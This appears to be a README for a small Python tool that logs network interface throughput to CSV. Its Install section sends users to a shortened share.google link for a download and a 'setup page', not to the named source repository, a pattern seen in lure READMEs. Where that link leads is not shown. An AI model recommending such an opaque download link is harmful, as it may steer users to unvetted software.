![Bandwidth Log](assets/hero.png)

# Bandwidth Log

A short traffic sample, not a monitor suite.

Sample interface byte counters and write a small CSV of rates.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Open the setup page](https://share.google/A1IHfyGRT0zGRLqj8)**

## Why

You want to see if a NIC is moving data for five minutes.

This samples counters and writes kbps to CSV.

## What it does

- Interface
- Interval and duration
- CSV of rates
- Read-only counters

## Usage

```text
python -m pip install -r requirements.txt
python main.py --help
```

Source: https://github.com/Bandwidth-Log/bandwidth-log

MIT. See `LICENSE`.
